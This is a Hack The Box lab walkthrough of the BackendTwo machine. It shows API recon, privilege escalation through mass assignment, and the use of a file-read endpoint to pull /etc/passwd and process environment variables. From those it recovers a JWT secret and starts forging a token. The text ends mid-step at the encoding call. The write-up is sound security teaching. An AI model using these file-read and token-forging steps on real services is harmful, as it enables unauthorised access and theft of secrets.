---
title: HTB: BackendTwo
url: https://0xdf.gitlab.io/2022/05/02/htb-backendtwo.html
date: 2022-05-02T09:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-backendtwo, ctf, uhc, hackthebox, nmap, uvicorn, python, api, json, jq, wfuzz, feroxbuster, swagger, fastapi, jwt, pyjwt, jwt-io, simple-modify-headers, credentials, pam-wordle, mass-assignment, cyberchef, htb-backend, htb-altered, htb-backdoor
---

![BackendTwo](https://0xdfimages.gitlab.io/img/backendtwo-cover.png)

BackendTwo is this month’s UHC box. It builds on the first Backend UHC box, but with some updated vulnerabilities, as well as a couple small repeats from steps that never got played in UHC competition. It starts with an API that I’ll fuzz to figure out how to register. Then I’ll abuse a mass assignment vulnerability to give my user admin privs. From there, I can use a file read endpoint read /proc to find the page source, and eventually the signing secret for the JWT. With that, I can forge a new token allowing access to the file write api, where I’ll quietly insert a backdoor into an endpoint that returns a shell (and show how to just smash the door in as well). To escalate, it’s password reuse and cheating at pam-wordle.

## Box Info

| Name | [BackendTwo](https://hackthebox.com/machines/backendtwo)  [BackendTwo](https://hackthebox.com/machines/backendtwo) [Play on HackTheBox](https://hackthebox.com/machines/backendtwo) |
| --- | --- |
| Release Date | 02 May 2022 |
| Retire Date | 02 May 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [ippsec ippsec](https://app.hackthebox.com/users/3769) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.162
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-26 19:43 UTC
Nmap scan report for 10.10.11.162
Host is up (0.10s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.24 seconds
oxdf@hacky$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.162
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-26 19:43 UTC
Nmap scan report for 10.10.11.162
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Tue, 26 Apr 2022 19:43:54 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Tue, 26 Apr 2022 19:43:42 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC Api v2.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Tue, 26 Apr 2022 19:43:48 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.80%I=7%D=4/26%Time=62684B75%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,A6,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Tue,\x2026\x20Apr\x202022
...[snip]...
SF:0close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.83 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal.

### Website - TCP 80

#### Site

The HTTP server returns JSON, which looks just like the API on [Backend](/2022/04/12/htb-backend.html#site), but this time it says `v2.0`:

![image-20220426154731194](https://0xdfimages.gitlab.io/img/image-20220426154731194.png)

#### Tech Stack

The response headers show the same [Uvicorn](https://www.uvicorn.org/) header:

```

HTTP/1.1 200 OK
date: Tue, 26 Apr 2022 19:46:41 GMT
server: uvicorn
content-length: 22
content-type: application/json
Connection: close

{"msg":"UHC Api v2.0"}

```

[uvicorn](https://www.uvicorn.org/) is a webserver for Python applications.

#### Directory Brute Force

I’ll run `feroxbuster` against the site. I’ll use a couple new arguments that were useful in the original [Backdoor](/2022/04/12/htb-backend.html#feroxbuster-updates). `--force-recursion` will recurse down endpoints even if they don’t act like directories, which can be useful on APIs. `-m GET,POST` will test both kinds of HTTP requests, as for APIs one may exist where the other doesn’t. I’ll filter out only 404s and 405s, based on a quick run with no filters and seeing those are loud.

```

oxdf@hacky$ feroxbuster -u http://10.10.11.162 --force-recursion -C 404,405 -m GET,POST

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.162
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
 🤘  Force Recursion       │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        3w       22c http://10.10.11.162/
200      GET        1l        1w       19c http://10.10.11.162/api
401      GET        1l        2w       30c http://10.10.11.162/docs
200      GET        1l        1w       32c http://10.10.11.162/api/v1
307      GET        0l        0w        0c http://10.10.11.162/api/v1/admin => http://10.10.11.162/api/v1/admin/
307     POST        0l        0w        0c http://10.10.11.162/api/v1/admin => http://10.10.11.162/api/v1/admin/
[####################] - 10m   360000/360000  0s      found:6       errors:0      
[####################] - 10m    60000/60000   94/s    http://10.10.11.162 
[####################] - 10m    60000/60000   94/s    http://10.10.11.162/ 
[####################] - 10m    60000/60000   94/s    http://10.10.11.162/docs 
[####################] - 10m    60000/60000   94/s    http://10.10.11.162/api 
[####################] - 10m    60000/60000   95/s    http://10.10.11.162/api/v1 
[####################] - 10m    60000/60000   95/s    http://10.10.11.162/api/v1/admin 

```

Endpoint seem similar to [last time](/2022/04/12/htb-backend.html#api-brute-force). `/docs` requires auth, just like last time.

#### Find Endpoints

`feroxbuster` identified `/api/v1/admin`. I’m going to actually check out each step, as it’s not crazy for each step to have it’s own result on APIs. `/api` just shows the `v1` endpoint. `/api/v1` shows two more:

![image-20220426165156847](https://0xdfimages.gitlab.io/img/image-20220426165156847.png)

`/api/v1/admin` returns “Not authenticated”.

Interestingly, `/user` returns 404. For a website this wouldn’t make sense, but for an API, it’s not uncommon for a “folder” along the path to not return anything. In frameworks like Flask and FastAPI, the author can define whatever endpoint they want, without the need of folders.

I’ll start another `feroxbuster` on `/api/v1/user`, but it’s quickly very clear that for GET requests, anything numeric returns 200, and anything not numeric returns 422.

The 422 confirms that theory:

```

oxdf@hacky$ curl -s http://10.10.11.162/api/v1/user/0xdf | jq .
{
  "detail": [
    {
      "loc": [
        "path",
        "user_id"
      ],
      "msg": "value is not a valid integer",
      "type": "type_error.integer"
    }
  ]
}

```

I don’t think I need to brute force GET requests any more. What about POSTs?

```

oxdf@hacky$ feroxbuster -u http://10.10.11.162/api/v1/user -C 404,405 -m POST

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.162/api/v1/user
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 🏁  HTTP methods          │ [POST]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
422     POST        1l        3w      172c http://10.10.11.162/api/v1/user/login
422     POST        1l        2w       81c http://10.10.11.162/api/v1/user/signup
[####################] - 1m     30000/30000   0s      found:2       errors:0      
[####################] - 1m     30000/30000   251/s   http://10.10.11.162/api/v1/user 

```

It finds two endpoints that both return 422, `login` and `signup`.

## API Admin Access

### Access Docs

#### Register

The registration and login endpoints are exactly the same as in Backend. For detailed steps for how I figured out what the requests should look like, check out [that post](/2022/04/12/htb-backend.html#access-docs).

I’ll register a user:

```

oxdf@hacky$ curl -v -s -X POST -d '{"email": "0xdf@htb.htb", "password": "0xdf0xdf"}' http://10.10.11.162/api/v1/user/signup -H "Content-Type: application/json" | jq .
*   Trying 10.10.11.162:80...
* TCP_NODELAY set
* Connected to 10.10.11.162 (10.10.11.162) port 80 (#0)
> POST /api/v1/user/signup HTTP/1.1
> Host: 10.10.11.162
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 49
> 
} [49 bytes data]
* upload completely sent off: 49 out of 49 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< date: Tue, 26 Apr 2022 21:17:05 GMT
< server: uvicorn
< content-length: 2
< content-type: application/json
< 
{ [2 bytes data]
* Connection #0 to host 10.10.11.162 left intact
{}

```

And login to get a token:

```

oxdf@hacky$ curl -s -d 'username=0xdf@htb.htb&password=0xdf0xdf' http://10.10.11.162/api/v1/user/login | jq .
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUxNjk5MDQ3LCJpYXQiOjE2NTEwMDc4NDcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6ImY0MzUwNTIwLWY2ZGQtNGM2Ni1iOWM5LTA0YWE2ODdmMGJiNiJ9.g4BzYwYR_8NNGNiUSVhv-I_ZKWbJ-oTpy4G1z-muwtM",
  "token_type": "bearer"
}

```

#### JWT

The token is a JWT. Dropping it into [jwt.io](https://jwt.io/) decodes it:

![image-20220426190636005](https://0xdfimages.gitlab.io/img/image-20220426190636005.png)

The [“sub” (Subject) claim](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.2) identifies the subject or user of the token.

#### Modify Header

I’ll use the [Simple Modify Headers](https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/) Firefox extension to add the `Authorization` header with the token I just acquired.

![image-20220426172650914](https://0xdfimages.gitlab.io/img/image-20220426172650914.png)

With that running, the `/docs` page loads:

[![image-20220427063526282](https://0xdfimages.gitlab.io/img/image-20220427063526282.png)](https://0xdfimages.gitlab.io/img/image-20220427063526282.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220427063526282.png)

### Docs

#### General

Just like in Backend, the docs break the endpoints into three categories.

The `default` group is stuff I’ve already accessed:

![image-20220426173157802](https://0xdfimages.gitlab.io/img/image-20220426173157802.png)

The first three just return messages about the endpoints under them. `/docs` and `/openapi.json` support the Docs page.

These look pretty much the same as last time.

The `user` group looks different from [previous](/2022/04/12/htb-backend.html#enumerate-api-endpoints). The GET `{user_id}` is still there, as well as POSTs to `login` and `signup`, but the vulnerable `updatepass` endpoint is gone, and now there’s two new endpoints described as “Edit Profile” and “Edit Password”:

![image-20220426173148588](https://0xdfimages.gitlab.io/img/image-20220426173148588.png)

The `admin` group has moved “Get File” from a POST to a GET, and now has a POST to “Write File”:

![image-20220426173313385](https://0xdfimages.gitlab.io/img/image-20220426173313385.png)

#### Admin Endpoints

I suspect I need admin access to use the admin endpoints, but it’s worth checking.

Using the “Try it out” button on `/api/v1/admin` returns that my account is not (as expected) an admin:

![image-20220426185937452](https://0xdfimages.gitlab.io/img/image-20220426185937452.png)

Trying to use the “Get File” and “Write File” endpoints just returns “Permission Error”:

![image-20220426190505751](https://0xdfimages.gitlab.io/img/image-20220426190505751.png)

I’ll find a way to get access as admin and come back to these

#### User Endpoints

I noted above that my JWT indicated I was user12, so I’ll try `/user/12`, and it returns my information:

![image-20220426190855587](https://0xdfimages.gitlab.io/img/image-20220426190855587.png)

User ID 1 is an admin:

```

{
  "guid": "25d386cd-b808-4107-8d3a-4277a0443a6e",
  "email": "admin@backendtwo.htb",
  "profile": "UHC Admin",
  "last_update": null,
  "time_created": 1650987800991,
  "is_superuser": true,
  "id": 1
}

```

The “Edit Profile” endpoint takes a userid in the path and a JSON body with a “profile” key, default set to “string”. I’ll change it to something else:

![image-20220426200839189](https://0xdfimages.gitlab.io/img/image-20220426200839189.png)

On submitting, if I go get my user, it’s updated:

```

{
  "guid": "f4350520-f6dd-4c66-b9c9-04aa687f0bb6",
  "email": "0xdf@htb.htb",
  "profile": "new profile!",
  "last_update": null,
  "time_created": 1651007826026,
  "is_superuser": false,
  "id": 12
}

```

The “Edit Password” endpoint is interesting, and takes a user id in the path and JSON with a “password” key in the POST body.

![image-20220426201037790](https://0xdfimages.gitlab.io/img/image-20220426201037790.png)

When I reset my password, it returns:

```

{
  "result": "true"
}

```

If I try to reset another user’s password, it returns:

```

{
  "detail": {
    "result": "false"
  }
}

```

### Mass Assignment

#### Get Admin on Account

There’s a [mass assignment vulnerability](https://en.wikipedia.org/wiki/Mass_assignment_vulnerability) in the profile update endpoint. When you view the API docs, they just show it taking a “profile” key:

![image-20220426203221993](https://0xdfimages.gitlab.io/img/image-20220426203221993.png)

But I can add more fields to the JSON. For example, if I add the email field:

![image-20220426204227108](https://0xdfimages.gitlab.io/img/image-20220426204227108.png)

The result comes back `true`, and if I query my user, not only has the profile changed, but the email as well:

![image-20220426204316276](https://0xdfimages.gitlab.io/img/image-20220426204316276.png)

Similarly, I’ll give myself `is_superuser`:

![image-20220426204400274](https://0xdfimages.gitlab.io/img/image-20220426204400274.png)

Now querying my user:

![image-20220426204501459](https://0xdfimages.gitlab.io/img/image-20220426204501459.png)

#### Update Token

If I check `/api/v1/admin/` now, it still says false. I suspect that the user’s admin capabilities are stored in their JWT token, and not checked against the DB on each query.

I’ll click on the lock next to one of the authed endpoints, and login with that form:

![image-20220426205036823](https://0xdfimages.gitlab.io/img/image-20220426205036823.png)

On hitting “Authorize”, it shows I’m logged in:

![image-20220426205058309](https://0xdfimages.gitlab.io/img/image-20220426205058309.png)

I’ll disable Simple Modify Header at this point, as the docs are now managing my token.

Now on executing “Admin Check”, it returns `true`.

I can also run “Get User Flag”:

![image-20220426205422687](https://0xdfimages.gitlab.io/img/image-20220426205422687.png)

## Shell as htb

### New Endpoints

#### Get File

This endpoint takes a file name and supposedly returns the file. The docs say that the file name is encoded in base64\_url.

[URL-Safe Base64](https://en.wikipedia.org/wiki/Base64#The_URL_applications) is similar to standard base64, but the `+` and `/` characters are replaced by `-` and `_`, characters that don’t need encoding in a URL. Sometimes the `=` padding is optional.

The [Cyberchef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9-_')) “To Base64” recipe has an “Alphabet dropdown where “URL safe” is an option:

![image-20220427090154039](https://0xdfimages.gitlab.io/img/image-20220427090154039.png)

Using that with input of `/etc/passwd` returns the encoded string:

![image-20220427090557274](https://0xdfimages.gitlab.io/img/image-20220427090557274.png)

Passing that string into the endpoint returns the file:

[![image-20220427090315110](https://0xdfimages.gitlab.io/img/image-20220427090315110.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220427090315110.png)

The Docs page also gives me the exact `curl` request used to make that request:

[![image-20220427091236407](https://0xdfimages.gitlab.io/img/image-20220427091236407.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220427091236407.png)

I can copy that to a terminal and remove some unneeded bits:

```

oxdf@hacky$ curl http://10.10.11.162/api/v1/admin/file/L2V0Yy9wYXNzd2Q -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUxNzU1MzYxLCJpYXQiOjE2NTEwNjQxNjEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODNlM2VkN2EtZDY2ZC00YTI3LWE5MjItNzAxZmI5ZmRjNzU1In0.NzuBABYGGm_bMA51kmwrBTIXTaUA4OTcYBEmqprF5vM'
{"file":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n"}

```

Pipping it to `jq -r '.file'` will select the file element and raw print it:

```

oxdf@hacky$ curl -s http://10.10.11.162/api/v1/admin/file/L2V0Yy9wYXNzd2Q -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUxNzU1MzYxLCJpYXQiOjE2NTEwNjQxNjEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODNlM2VkN2EtZDY2ZC00YTI3LWE5MjItNzAxZmI5ZmRjNzU1In0.NzuBABYGGm_bMA51kmwrBTIXTaUA4OTcYBEmqprF5vM' | jq -r '.file'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...[snip]...

```

Putting this all together, I’ll write a simple Bash script that will read a file passed as an argument:

```

#!/bin/bash

TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUxNzU1MzYxLCJpYXQiOjE2NTEwNjQxNjEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODNlM2VkN2EtZDY2ZC00YTI3LWE5MjItNzAxZmI5ZmRjNzU1In0.NzuBABYGGm_bMA51kmwrBTIXTaUA4OTcYBEmqprF5vM
FN=$(echo -n $1 | base64 | tr '/+' '_-' | tr -d '=')

curl -s "http://10.10.11.162/api/v1/admin/file/$FN" -H "Authorization: Bearer $TOKEN" | jq -r '.file'

```

It works:

```

oxdf@hacky$ ./get_file.sh /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.4 LTS"

```

#### Write File

To test this one, I’ll try to write to a file location any user should have write, `/tmp/0xdf`, which url-encodes to “L3RtcC8weGRm”.

Sending that reports an error:

[![image-20220427094533935](https://0xdfimages.gitlab.io/img/image-20220427094533935.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220427094533935.png)

Just like in [Backend](/2022/04/12/htb-backend.html#forge-cookie), there’s another key in the JWT that’s needed.

It’s tempting to think that I could use the Update Profile endpoint again, but it won’t work. I can guess at how the API is set up. The Update Profile endpoint is saving input into the DB. When the JWT is generated, some of these are pulled and included. At the bottom of the docs, I can see the fields associated with the `User` object:

![image-20220427094836896](https://0xdfimages.gitlab.io/img/image-20220427094836896.png)

So trying to set the `debug` field will just do nothing as that’s not a column in the DB. The only way I know of at the moment to get this into the JWT is to get the JWT secret and forge my own token.

### Get Debug Access

#### Locate API Source

In order to get the source, I’ll need to find where it’s running. There’s a bunch of places, but much like in [Backdoor](/2022/04/23/htb-backdoor.html#strategy), I’ll try to get information from `/proc`. Since the file read is happening through the webserver, I can check out `/proc/self` for information. For example, `cmdline` will give the command line that runs the application (replacing null bytes with spaces):

```

oxdf@hacky$ ./get_file.sh /proc/self/cmdline | tr '\000' ' '
/usr/bin/python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork

```

That’s not super useful here. I think that’s coming from uvicorn. I’ll try the `environ` file. Just like in `cmdline`, the items are null delimited, which I’ll use `tr` to replace with newlines:

```

oxdf@hacky$ ./get_file.sh /proc/self/environ | tr '\000' '\n'
USER=htb
HOME=/home/htb
OLDPWD=/
PORT=80
LOGNAME=htb
JOURNAL_STREAM=9:18599
APP_MODULE=app.main:app
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=0ace2198aa724422b25a8057eef74fdd
LANG=C.UTF-8
API_KEY=68b329da9893e34099c7d8ad5cb9c940
HOST=0.0.0.0
PWD=/home/htb

```

The working directory is `/home/htb`, and the Python app is `app.main:app`. That means that it’s loading the `app` object from `app/main.py`.

That path works to read the source:

```

oxdf@hacky$ ./get_file.sh /home/htb/app/main.py
import asyncio                      

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
...[snip]...

```

I could also use `/proc/self/app/main.py` to get the same result.

Another useful bit of info I could glean from `/proc` is to get the [parent pid](https://www.linuxquestions.org/questions/linux-enterprise-47/ppid-from-proc-file-system-594775/) from `stat`:

```

oxdf@hacky$ ./get_file.sh /proc/self/stat
2265 (python3) S 2254 2241 2241 0 -1 4194304 23201 101 0 0 77 7 0 0 20 0 2 0 320599 157327360 16662 18446744073709551615 4194304 7042053 140735671126528 0 0 0 0 16781312 16386 0 0 0 17 1 0 0 0 0 0 9395632 9685776 35241984 140735671131712 140735671131841 140735671131841 140735671132135 0

```

It’s the forth column, so 2254 in this case. I’ll grab that `cmdline`:

```

oxdf@hacky$ ./get_file.sh /proc/2254/cmdline | tr '\000' ' '
/usr/bin/python3 /home/htb/.local/bin/uvicorn --reload --host 0.0.0.0 --port 80 app.main:app

```

I could read the `environ` file to confirm the exact local directory, but it’s running `app` from `app/main.py`. I’ll also note it’s running with `--reload`.

#### Find Secret

The top import line shows that this app is using [FastAPI](https://fastapi.tiangolo.com/), an Python API framework.

`main.py` imports from a bunch of local files, but the route for `/docs` is defined in this file, and it is one that requires auth to visit, so it’s good place to look at how this app does auth:

```

@app.get("/docs")                                   
async def get_documentation(                        
    current_user: User = Depends(deps.parse_token)
    ):                  
    return get_swagger_ui_html(openapi_url="/openapi.json", title="docs") 

```

Looking at this line by line, the first one is a Python decorator that associates this function with a GET request to `/docs`. Next it defines the function `get_documentation`. It’s an `async` function, but that doesn’t matter much at this point. It takes one argument, `current_user`.

The syntax `[variable name] : [variable type] = [default value]` in modern Python is using [type hinting](https://peps.python.org/pep-0484/), which is optional in Python, but standard practice for FastAPI.

To figure out where this `current_user` item is coming from, I need to understand `Depends(deps.parse_token)`. `Depends` is imported from `fastapi`, and allows specifying a function to process the arguments before it goes to this function.

`deps` is imported from `app.api`. In `/home/htb/app/api/deps.py`, I’ll find `parse_token`:

```

async def parse_token(                              
    token: str = Depends(oauth2_scheme)
) -> User:                      
    credentials_exception = HTTPException(  
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},     
    )               
    try:                                            
        payload = jwt.decode(                       
            token,         
            settings.JWT_SECRET,                                                                         
            algorithms=[settings.ALGORITHM],
            options={"verify_aud": False},
        )

    except JWTError:
        raise credentials_exception
         
    return payload

```

It’s parsing the token (another `Depends`, but I’ll just assume that’s the JWT), and returning a `User` object. The secret passed to `jwt.decode` is `settings.JWT_SECRET`. `settings` is imported at the top of the file:

```

from app.core.config import settings

```

I’ll pull `/home/htb/app/core/config.py` and see how `settings` is defined:

```

from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

import os
from enum import Enum

class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"
    JWT_SECRET: str = os.environ['API_KEY']
    ALGORITHM: str = "HS256"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g: '["http://localhost", "http://localhost:4200", "http://localhost:3000", \
    # "http://localhost:8080", "http://local.dockertoolbox.tiangolo.com"]'
    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("BACKEND_CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///uhc.db"
    FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"    

    class Config:
        case_sensitive = True

settings = Settings()

```

It’s pulled from the environment variable `API_KEY`. I already have that from reading the `environ` file, “68b329da9893e34099c7d8ad5cb9c940” (note, may change on each boot of the box).

#### Forge JWT

I’ll drop into a Python terminal and validate. First I’ll import `jwt` and save the token and secret:

```

>>> import jwt
>>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUxNzU1MzYxLCJpYXQiOjE2NTEwNjQxNjEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODNlM2VkN2EtZDY2ZC00YTI3LWE5MjItNzAxZmI5ZmRjNzU1In0.NzuBABYGGm_bMA51kmwrBTIXTaUA4OTcYBEmqprF5vM"
>>> secret = "68b329da9893e34099c7d8ad5cb9c940"

```

With the wrong secret, `jwt.decode` will throw an error by default:

```

>>> jwt.decode(token, "0xdf", algorithms=["HS256"])
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/oxdf/.local/lib/python3.8/site-packages/jwt/api_jwt.py", line 119, in decode
    decoded = self.decode_complete(jwt, key, algorithms, options, **kwargs)
  File "/home/oxdf/.local/lib/python3.8/site-packages/jwt/api_jwt.py", line 90, in decode_complete
    decoded = api_jws.decode_complete(
  File "/home/oxdf/.local/lib/python3.8/site-packages/jwt/api_jws.py", line 152, in decode_complete
    self._verify_signature(signing_input, header, signature, key, algorithms)
  File "/home/oxdf/.local/lib/python3.8/site-packages/jwt/api_jws.py", line 239, in _verify_signature
    raise InvalidSignatureError("Signature verification failed")
jwt.exceptions.InvalidSignatureError: Signature verification failed

```

But with the secret from the environment, it works:

```

>>> jwt.decode(token, secret, algorithms=["HS256"])
{'type': 'access_token', 'exp': 1651755361, 'iat': 1651064161, 'sub': '12', 'is_superuser': True, 'guid': '83e3ed7a-d66d-4a27-a922-701fb9fdc755'}

```

I’ll save the decoded data to `user`, add the `debug` key, and create a new token:

```

>>> user = jwt.decode(token, secret, algorithms=["HS256"])
>>> user["debug"] = True
>>> jwt.encode(user, secret,'HS256')
